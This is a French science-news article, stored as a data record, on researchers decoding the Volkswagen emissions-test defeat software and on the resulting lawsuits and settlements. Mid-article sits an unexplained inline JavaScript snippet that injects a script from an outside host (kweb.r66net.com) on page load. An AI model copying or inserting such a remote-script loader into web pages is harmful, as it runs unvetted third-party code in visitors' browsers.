{"title": "Tests antipollution : l'algorithme de Volkswagen decode", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-05-23", "content": "Au terme d'un an d'enquete, une equipe internationale de chercheurs a analyse le fonctionnement du logiciel que le constructeur allemand Volkswagen a utilise pour tricher aux tests antipollution. Ils en livrent les secrets de fonctionnement. Ce qu'il faut retenir Des chercheurs ont examine en detail le logiciel trompeur de Volkswagen qui s'avere d'une grande sophistication. Le logiciel savait detecter une procedure de tests antipollution pour activer un profil moteur generant un taux d'emission de gaz conforme aux normes en vigueur aux Etats-Unis. << Le  logiciel  trompeur de Volkswagen est assurement le plus complexe de l'histoire de l'automobile >> . Ce constat, c'est Kirill Levchenko qui l'a dresse. Cet ingenieur informaticien de l'universite de Californie a San Diego (Etats-Unis) a dirige une equipe internationale qui a explore durant un an le code informatique employe par le constructeur automobile dans ses vehicules diesel pour contourner les tests antipollution americains et europeens. Revelee en septembre 2015, l'affaire a declenche un scandale mondial, entrainant la demission de Martin Winterkorn, le PDG du groupe Volkswagen. Pour rappel, le logiciel trompeur de Volkswagen faussait le niveau des  emissions  d'oxydes d' azote  (NOx) des voitures equipees de moteurs diesel lors des tests antipollution. Le programme informatique etait capable de comprendre que le vehicule entamait une telle procedure et il activait alors le systeme de controle des emissions de  gaz  polluants. Une fois le test acheve, ce dernier etait desactive, ce qui se traduisait par un taux d'emission d'oxydes d'azote quarante fois superieur aux valeurs admises par l'Agence Federale de Protection de l'Environnement (EPA). L'equipe de Kirill Levchenko est parvenue a se procurer le code informatique employe par Volkswagen sur ses modeles Jetta, Golf et Passat, ainsi que par Audi sur ses series A et Q. Pour mieux comprendre son fonctionnement, il faut savoir comment se deroule un test antipollution. Le vehicule roule sur une plateforme munie de rouleaux relies a un dynamometre afin de simuler divers scenarios de conduite urbaine. Cette procedure standardisee etant publique, il est assez simple pour un constructeur de modifier le comportement de son vehicule afin de s'y conformer. Selon les chercheurs qui ont examine le logiciel trompeur de Volkswagen, les tests antipollution actuels qui reposent sur un dynamometre sont obsoletes face a la sophistication des systemes embarques. (c) UC San Diego                               Le logiciel Volkswagen peut generer differents profils de comportement moteur C'est exactement ce que faisait le logiciel des Volkswagen diesel en detectant un certain nombre de conditions specifiques liees a un test antipollution :  vitesse , position des roues, distance, temps ecoule, etc. Il pouvait alors enclencher le systeme de reduction des emissions de gaz afin de mettre le moteur dans les clous fixes par l'EPA. Les chercheurs ont examine 900 versions de ce code informatique et constate que 400 d'entre elles contenaient le mode trompeur.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ils ont egalement decouvert que le code pouvait generer une dizaine de profils de comportement moteur pour s'adapter aux tests. Au cours de ses travaux, l'equipe de Kirill Levchenko a trouve une version moins elaboree de ce type de logiciel a bord d'une Fiat 500X. Le programme se contentait d'indiquer a l' ordinateur  embarque d'activer le systeme de reduction des emissions pendant une  duree  de 26 minutes et 40 secondes, ce qui est le delai moyen des tests antipollution.  Dans leur rapport, les chercheurs soulignent que Volkswagen et Fiat utilisent pour le controle de leur moteurs le meme boitier electronique ECU ( Engine Control Unit ) fabrique par Bosch. Ce sont les constructeurs qui ont ensuite modifie l'ECU pour y ajouter leur algorithme. Vise conjointement avec Volkswagen par une plainte classee en recours collectif deposee fin 2015 par des clients en Californie, l'equipementier  Bosch  a fini par transiger. En fevrier 2017, il a annonce qu'il proposait de verser 327,5 millions de dollars (environ 292 millions d'euros au cours actuel) pour dedommager les proprietaires de Volkswagen concernes par ce << dieselgate >>. Dans son communique, Bosch precise cependant qu'avec cet accord, il  << ne reconnait pas les faits allegues par les plaignants et n'accepte aucune responsabilite >> . Enquetes en cours contre PSA, Renault et Fiat-Chrysler Quant a Volkswagen, il a finalement passe un accord amiable avec les autorites americaines en s'engageant a verser pres de 25 milliards de dollars aux Etats-Unis (22 milliards d'euros) et a racheter 500.000 voitures equipees de son logiciel tricheur. Par ailleurs, en avril dernier, le  parquet  de Paris a ouvert une information judiciaire pour tromperie a l'encontre du groupe  PSA  (Peugeot, Citroen et DS) apres avoir fait de meme pour Volkswagen, Renault et Fiat-Chrysler. De leur cote, les auteurs de l'etude du logiciel trompeur ont presente leurs travaux ( How They Did It: An Analysis of Emission Defeat Devices in Modern Automobiles ) au 38 e  symposium  IEEE  sur la Securite et la  Confidentialite  qui se tient cette semaine a San Francisco. Dans leur conclusion, ils estiment que les tests antipollution a partir d'un dynamometre sont desormais insuffisants face a l'electronique et aux logiciels embarques dans les  automobiles . Ils en appellent au developpement d'outils plus sophistiques. Pour en savoir plus Tests antipollution : comment Volkswagen a triche a l'aide d'un algorithme Article initial de  Marc Zaffagni , paru le 22/09/2015 Tricherie... Scandale mondial... Milliards de dollars... L'affaire du logiciel trompeur de Volkswagen prend une dimension planetaire. Mais comment fonctionne-t-il ? Efficace, cet algorithme permettait aux vehicules diesel de passer sans encombre les controles de pollution aux Etats-Unis alors qu'en conditions reelles, les emissions d'oxydes d'azote sont quarante fois superieures a la limite admise. En fait, ce logiciel est initialement indispensable pour que l'informatique de bord tolere le banc de test. Il a juste ete un peu modifie... A quelques semaines du debut de la Conference des Nations unies sur les changements climatiques a Paris, la fameuse  COP 21 , l'affaire tombe au plus mal pour Volkswagen et va peut-etre rejaillir sur d'autres constructeurs automobiles. Le groupe allemand vient d'admettre qu'il avait deliberement fausse les tests antipollution pratiques aux Etats-Unis par l'Agence Federale de Protection de l'Environnement (EPA) pour mesurer le niveau d'emission de gaz polluants des vehicules a moteur. La tricherie s'operait grace a un logiciel capable de detecter la procedure de test antipollution et d'activer les controles d'emission de gaz pour se conformer aux normes en vigueur. Comme l'explique l'association de consommateurs  Consumer Report , les voitures munies de cet algorithme disposaient d'un << mode route >> et d'un << mode test >>. Ce dernier est utilise lors des controles d'emissions polluantes et de consommation qui s'effectuent sur des bancs de roulage ou seules les roues motrices sont en  mouvement . Cette situation devrait creer une alerte pour l'informatique du bord. En effet, les systemes d'assistance a la conduite de la  voiture  interpretent cette situation comme dangereuse et pourraient activer les controles de traction et de stabilite. D'ou la presence d'un mode test pour que la procedure de controle puisse se derouler sans encombre.  Volkswagen  n'est pas le seul constructeur a recourir a cette technique. Mais il se trouve que ce mode test a ete configure pour produire des resultats qui n'ont rien a voir avec l'utilisation en conditions reelles. Sur le banc de test, les voitures equipees de ce logiciel trompeur sont dans les clous des normes antipollution. Mais une fois sur la route, les emissions d'oxydes d'azote (NOx) atteignent quarante fois la norme. La supercherie a ete decouverte grace aux travaux de chercheurs de l'universite de Virginie Occidentale qui ont collabore avec l'ONG International Council on Clean Transportation ( ICCT ).  Le groupe Volkswagen reunit plusieurs grandes marques automobiles. Pour le moment, seules Audi et Volkswagen sont concernees par ce scandale. Aux Etats-Unis, la commercialisation des modeles a moteur diesel a ete suspendue jusqu'a nouvel ordre. (c) Volkswagen AG                                Onze millions de vehicules sont concernes << L'efficacite des systemes de controle des emissions polluantes de ces vehicules etaient grandement reduite dans les situations de conduite normales >>  souligne l' EPA  dans son communique de presse.  Martin Winterkorn , le PDG du groupe Volkswagen a reconnu les faits, presente ses excuses et assure que l'entreprise cooperera pleinement avec les autorites. Aux Etats-Unis, la decouverte concerne 482.000 voitures produites entre 2009 et 2015 parmi lesquelles des modeles tres populaires comme l' Audi A3  (sacree voiture verte de l'annee 2010 par la revue americaine Green Car...), la  Golf  ou encore la Passat. Mais le groupe Volkswagen a par la suite revele que le logiciel etait utilise sur tous les vehicules equipes d'un moteur type EA189, soit 11 millions d'exemplaires a travers le monde !  << Pour la majorite de ces moteurs, le logiciel n'a aucun effet >> , assure  Volkswagen  dans son communique. Vraiment ? Le constructeur automobile allemand est sous le coup d'une enquete penale aux Etats-Unis pour avoir enfreint au moins deux dispositions de la loi  Clean  Air  Act . Il risque une amende qui pourrait aller jusqu'a 18 milliards de dollars (16 milliards d'euros). L'entreprise dit avoir deja provisionne 6,5 milliards d'euros pour couvrir les consequences financieres de cette affaire. Desormais, de forts soupcons pesent sur les pratiques de la firme dans le reste du monde, mais egalement sur l'ensemble des constructeurs automobiles. Volkswagen est-il vraiment le seul a employer ce genre de methode ?  L'Allemagne, la France, l'Italie mais aussi la Coree du Sud ont deja lance ou reclame une enquete. Le ministre des Finances  Michel Sapin , soutenu par les constructeurs automobiles francais, a estime qu'une investigation a l'echelle europeenne couvrant tous les fabricants etait necessaire. L'affaire ne fait que commencer...  Interview : les dangers des microparticules, par Paul Hofman                       La pollution de l'air par les microparticules est un probleme qui touche une bonne partie de la France. Futura-Sciences a interroge Paul Hofman, directeur du laboratoire de pathologie de Nice et chercheur pionnier dans la detection du cancer du poumon, pour en savoir plus sur les risques engendres par les microparticules.                                       ", "theme": "tech"}